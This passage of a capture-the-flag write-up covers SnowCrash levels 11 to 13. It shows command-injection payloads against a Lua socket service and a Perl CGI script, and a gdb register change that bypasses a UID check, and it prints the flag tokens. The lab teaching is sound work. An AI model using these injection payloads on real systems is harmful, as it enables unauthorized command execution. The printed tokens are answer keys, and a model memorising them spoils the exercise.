	[C]: ?
```

This file is not executable. So let's see the code:
```bash
level11@SnowCrash:~$ cat level11.lua 
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

So as we can see, the lua script is trying to open a server, but when executing it ourselves, it says the address is already in use.

So maybe the server is already up, and they gave us the code just to inspect what could be the entrypoint to get the flag:
```bash
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: 
```

It requests us a password, like the lua script should do. So the server is indeed already up, and this is indeed the server's code.

But we have no way of getting the password. And even if we could, when we look closer at the code, if we manage to find the password, nothing will happen except sending a message:
```lua
if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
  client:send("Erf nope..\n");
else
  client:send("Gz you dumb*\n")
end
```

The real thing here is actually how the password is hashed:
```lua
function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end
```

We can see this:
```lua
prog = io.popen("echo "..pass.." | sha1sum", "r")
```

### Retrieving the token

``io.popen()`` is the equivalent of ``os.execute()``. And as we can guess, it can run commands. The only difference between these 2 functions, is what the output looks like (way easier to read with ``io.popen()``). The exploit is similar to some of others exploits we already did with ``echo`` when letting users put their own string. So let's use this to run ``getflag`` and store it somewhere:
```bash
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: ; getflag > /tmp/flag
Erf nope..
level11@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

And it worked! We got the token, so let's go onto the next level:
```bash
level11@SnowCrash:~$ su level12
Password: 
level12@SnowCrash:~$ 
```

</details>

## level12

<details>

<summary>Explanations</summary>

###

This time we have a Perl script:
```Perl
level12@SnowCrash:~$ cat level12.pl 
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

It is like level 4, so let's make a request to ``localhost:4646``:
```bash
level12@SnowCrash:~$ curl localhost:4646
..level12@SnowCrash:~$ 
```

It just prints 2 ``.`` without newline. So let look at the code.

The first thing the code does is calling a ``t`` function. And this is actually the only function we will care about.

Important note: the script takes a ``x`` and a ``y`` param in the request. We can see it by ``param("x")`` and ``param("y")``.

First thing in this function, we gather the args:
```Perl
$nn = $_[1];
$xx = $_[0];
```

``$xx`` is the first arg that we pass in ``t``, which is the param ``x``.
``$nn`` is the second arg that we pass in ``t``, which is the param ``y``.

And from there we don't touch to ``$nn`` anymore, however, the script is going to modify ``$xx``:
```Perl
$xx =~ tr/a-z/A-Z/; 
$xx =~ s/\s.*//;
```

What happen is:
- ``$xx =~ tr/a-z/A-Z/;``: transform all ``$xx`` **lowercases** in **uppercases**.
- ``$xx =~ s/\s.*//;``: delete all characters of ``$xx`` after the first space encountered.

If we send something like ``/bin/getflag > /tmp/flag``, it will be transformed as ``/BIN/GETFLAG``

Next line is the most important one: ``@output = `egrep "^$xx" /tmp/xd 2>&1`;``

What this line is supposed to do is run the command ``egrep`` with **OUR** arg in the file ``/tmp/xd``. But exactly as the previous levels with ``echo``, we can force the code to run another command. This time it is quite different since our arg is behind modified. Everything is going to be in uppercases, and we can only do it in one string, no space or it's going to be deleted.

### Retrieving the token

The strategy first is going to have a script named with only uppercases, like ``GETFLAG``, so even with the transformation, it will be executable.

This script will run everything ``/bin/getflag > /tmp/flag``. This way, we can avoid everything being deleted after the first space. We also need to give the permission to execute the script: ``chmod +x /tmp/GETFLAG``.

Now we need to bypass the path ``/tmp`` when running the script ``/tmp/GETFLAG``. To bypass that, we can actually use ``*``. It is going to search in all files a file named ``GETFLAG``, and this ``/tmp/GETFLAG`` is the only one, there is no problem with doing that.

Our command will look like this: ``/*/GETFLAG``. But if we just use this in the ``x`` param, it's going to be interpreted as text. So we need to do like we did in a previous level with ``$()``. Which gives us ``$(/*/GETFLAG)``.

Let's try all of that:
```bash
level12@SnowCrash:~$ echo "/bin/getflag > /tmp/flag" > /tmp/GETFLAG
level12@SnowCrash:~$ chmod +x /tmp/GETFLAG
level12@SnowCrash:~$ curl 'localhost:4646/?x=$(/*/GETFLAG)'
..level12@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
level12@SnowCrash:~$ 
```

And we got our token! Let's try it out:
```bash
level12@SnowCrash:~$ su level13
Password: 
level13@SnowCrash:~$ 
```

Valid token, let's go on the next level.

</details>

## level13

<details>

<summary>Explanations</summary>

###

This level is a little trickier. We have a program named ``level13``:
```bash
level13@SnowCrash:~$ ./level13 
UID 2013 started us but we we expect 4242
```

We have nothing more, so let's see what the program does:
```bash
level13@SnowCrash:~$ ltrace ./level13 
__libc_start_main(0x804858c, 1, 0xbffff7f4, 0x80485f0, 0x8048660 <unfinished ...>
getuid()                                                                                                                          = 2013
getuid()                                                                                                                          = 2013
printf("UID %d started us but we we expe"..., 2013UID 2013 started us but we we expect 4242
)                                                                               = 42
exit(1 <unfinished ...>
+++ exited (status 1) +++
```

As we can see, the code gets the uid with the help of the function ``getuid()`` 2 times. The first time is probably to make the check, and the second time to print the error message. The program excepts us to change the UID to 4242. But without rooting, we can't change the user id of level13. So what we actually need to do, is manipulate **registers** when the program is running.

To do so, we need to use a debug tool, like GDB which is installed by default, to disassemble the program:
```bash
level13@SnowCrash:~$ gdb level13
#...
(gdb) 
```

Now that we are in gdb with level13 opened, we need first to open the ASM pannel:
```bash
(gdb) lay asm
```
[Layout Assembly](https://ibb.co/yFRhJFqy)

This is hard to read anything because of the current ASM synthax. To change that, we are going to use the Intel syntax, that is way easier to read:
```bash
(gdb) set disassembly-flavor intel
```

This is how it should look like:

[Intel syntax](https://ibb.co/gFhbpjFm)

Now we can already understand what is happening:
- The code calls ``getuid``: ``call   0x8048380 <getuid@plt>``
- Compares the result (stored in eax) with the address ``0x1092`` (that is probably 4242): ``cmp    eax,0x1092``
- If equals, the code jumps a big part of itself: ``0x80485cb <main+63>``
- If not equals, the code continues, ``printf`` something and then ``exit`` (at ``main+58``) right before the jump should arrive (at ``main+63``).

Not equals is what happens to us at the moment, which means that this ``printf`` is our current message. Which means we want the jump to happens.

Since we are in Assembly, everything is stored in registers. And since we are disassembling the code, we can make it run instruction by instruction. And this is what we are going to abuse here.

### Retrieving the token

If we just ``run`` in gdb, it is going to run all the code, which is annoying in our situation. What we can do is add a breakpoint on the ``main`` function. Which will stop the code at the beginning of ``main``:
```bash
(gdb) break *main
Breakpoint 1 at 0x804858c
(gdb) run
Starting program: /home/user/level13/level13 

Breakpoint 1, 0x0804858c in main ()
(gdb) 
```

Good, now that we are stopped at the beginning of the ``main``, we can actually start going instruction by instruction, with the command ``ni`` (next instruction). We need to reach the line **RIGHT AFTER** the first ``getuid`` call.

When it is done, we can try to print the register we identify earlier, to check if we are right:
```bash
(gdb) print $eax
print $eax
$1 = 2013
```

And we are right, ``eax`` contains our UID. And this is actually normal. When calling a function in ASM, if the function returns something, it goes into the register ``eax``.

We can also check if the address is indeed ``4242``:
```bash
(gdb) print 0x1092
print 0x1092
$3 = 4242
```

We were also right! So now, what we need to do is change what is inside the register ``eax``, before the comparison (``cmp``). To do so:
```bash
(gdb) set $eax = 4242
set $eax = 4242
(gdb) print $eax
print $eax
$4 = 4242
```

It couldn't be more easy. So now let's use ``next`` to go until the end of the program, and see if it worked:
```bash
your token is 2A31L79asukciNyi8uppkEuSx
```

The display is being very broken for some reason, but this line appears. Let's try the token:
```bash
level13@SnowCrash:~$ su level14
Password: 
level14@SnowCrash:~$ 
```

And this is it! Now let's head on the last level

</details>
